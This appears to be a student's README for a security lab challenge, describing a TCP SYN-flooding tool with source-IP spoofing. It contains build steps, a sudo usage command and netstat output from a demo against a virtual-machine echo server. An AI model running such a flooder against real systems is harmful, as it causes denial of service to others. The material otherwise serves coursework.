# ⚗️ Challenge Sigma

Nom: Marques Andreotti

Prénom: João


# 🏗️ Build

To build the TCP flooding tool run:
```bash
make clean
make
```

After building the tool, you can use it by running:
```bash
sudo ./tcp_flooder (source_ip) (network_mask) (dest_ip) (dest_port)
```

Where the network mask is used in the randomization of the source IP. For instance, we could run:
```bash
sudo ./tcp_flooder 192.168.56.1 255.255.255.0 192.168.56.101 2000
```

# 🧪 Demo

The tool was used against an echo server running on a virtual machine. We can verify that the server works as intended before the attack starts but that new connections are impossible as soon as the tool is used.

We can verify that the server is saturated with requests to open new TCP connections by running `netstat`. Running `netstat` on the server while attacking it yields:

```bash
tcp        0      0 192.168.56.1:cisco-sccp 192.168.56.15:19934     SYN_RECV   
tcp        0      0 192.168.56.1:cisco-sccp 192.168.56.38:52778     SYN_RECV   
tcp        0      0 192.168.56.1:cisco-sccp 192.168.56.65:18734     SYN_RECV   
tcp        0      0 192.168.56.1:cisco-sccp 192.168.56.8:10295      SYN_RECV   
tcp        0      0 192.168.56.1:cisco-sccp 192.168.56.49:6898      SYN_RECV   
tcp        0      0 192.168.56.1:cisco-sccp 192.168.56.84:45232     SYN_RECV   
tcp        0      0 192.168.56.1:cisco-sccp 192.168.56.117:41090    SYN_RECV   
tcp        0      0 192.168.56.1:cisco-sccp 192.168.56.2:41811      SYN_RECV   
tcp        0      0 192.168.56.1:cisco-sccp 192.168.56.47:62792     SYN_RECV   
(...)
```